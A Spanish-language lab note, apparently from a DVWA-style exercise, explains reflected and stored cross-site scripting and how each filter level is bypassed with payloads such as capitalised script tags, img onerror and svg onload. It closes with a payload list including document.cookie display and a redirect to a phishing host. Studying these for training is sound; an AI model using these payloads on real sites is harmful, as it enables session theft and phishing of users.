
---

## ¿Qué es?

Es un ataque de inyección de código malicioso `Javascript` en el campo de entrada de un sitio web. Ejecutándose en el navegador del usuario.

---
## Tipos

#### XSS Reflejado

La entrada maliciosa del usuario se refleja inmediatamente desde el servidor al navegador de la víctima.

**Nivel bajo**

```
<script>alert("Hacked")</script>
```

**Nivel Medio**

```
<Script>alert("Hacked")</Script>
```

Este payload funciona en el nivel medio ya que la función `str_replace()`de PHP solo busca y elimina la cadena de texto exacta. Ej:

```
$name = str_replace('<script>','',$_GET['name']);
```

**Nivel Alto**

```
<img src=x onerror=alert("Hacked")>
```

El motivo de este payload es debido a la mejora de este nivel, la función `preg_replace` con el modificador `/i`, elimina todas las ocurrencias de `<script>`. 

Al insertar una imagen con un `src` inválido salta el error y se ejecuta el contenido de `onerror=`
#### XSS Almacenado

La entrada maliciosa se almacena permanentemente en el servidor y se ejecuta cada vez que un usuario visita la página. Representa una amenaza alta por su persistencia.

**Nivel Bajo**

La aplicación no implementa ninguna sanitización de entrada. En el campo **Message** se incluye el siguiente script:

```
<script>alert("Hacked")</script>
```

![[Pasted image 20260128160739.png]]

Al pulsar en el botón **Sign Guestbook** se registrará el message y se ejecutará el payload cada vez que alguien entre a la página.

**Nivel Medio**

En el caso del Nivel Medio el campo de Message elimina todas las etiquetas HTML, pero no el  campo Name que tiene en el código la siguiente sanitización.

```
$name = str_replace('<script>','',$name);
```

Igual que en el ejemplo de XSS Reflejado el payload lo haremos con la primera letra de la etiqueta en mayúscula.

Pero al tener una longitud predefinida en la etiqueta HTML tendremos que modificarla desde el cliente.

![[Pasted image 20260128163216.png]]

**Nivel Alto**

La fortificación de esta opción consta de lo siguiente:

```
$name = preg_replace('/<script>/i','',$name);
```

Lo convierte en *Case-Insensitive* bloqueando todas las variantes.

Por lo tanto utilizaremos la etiqueta `<svg>` ya que no detecta esta etiqueta el saneamiento.

Primero eludiremos la restricción del `maxlenght` en el campo Name y después inyectar el siguiente payload:

```
<svg/onload=alert('Hacked')>
```

El evento onload del SVG se dispara al cargar la página.

---

## Ejemplos de Payloads

#### Cookie PHPSESSID

```
<script>alert(document.cookie); </script>
```

#### Insertando una imagen fake

```
<img src=x onerror=alert('XSS');>
```

#### XSS en SVG

```
<svg onload='alert(document.domain)'/>
```

#### Payload de Redirección

Lleva a la víctima a sitios maliciosos:

```
window.location.href = “[https://phishing.com](https://phishing.com/)“;
```

